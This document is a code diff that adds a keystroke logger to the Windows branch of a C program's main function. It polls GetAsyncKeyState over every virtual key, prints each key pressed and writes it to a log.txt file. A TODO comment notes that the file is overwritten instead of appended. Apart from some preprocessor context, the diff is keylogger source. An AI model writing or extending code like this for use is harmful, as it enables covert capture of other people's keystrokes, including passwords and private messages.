@@ -37,12 +37,37 @@
   }
 // Windows - The main program
 #elif defined (_WIN32)
-  #include <windows.h>
+  #include <Windows.h>
+  #pragma comment(lib, "User32.lib")
   // Run main function
   int main(){
     printf("Compiled on windows\n");
 
-    //loop keeping it running
+    int last_vKey = 0;
+  	while (1){
+  		for (int vKey = 0; vKey < 255; ++vKey)
+  		{
+  			if (GetAsyncKeyState(last_vKey) != 0)
+  				continue;
+
+  			last_vKey = 0;
+
+  			if (GetAsyncKeyState(vKey) != 0)
+  			{
+  				last_vKey = vKey;
+
+  				FILE *f = NULL;
+          //Todo: check if file exist and then use "a" mode instead to append
+  				fopen_s(&f, "log.txt", "w");
+
+  				char buf[2];
+          printf("[*] Key pressed: %c \n", vKey);
+  				sprintf_s(buf, sizeof(buf), "%c", vKey);
+  				fwrite(buf, 1, 1, f);
+  				fclose(f);
+  			}
+  		}
+  	}
 
   }
 #elif
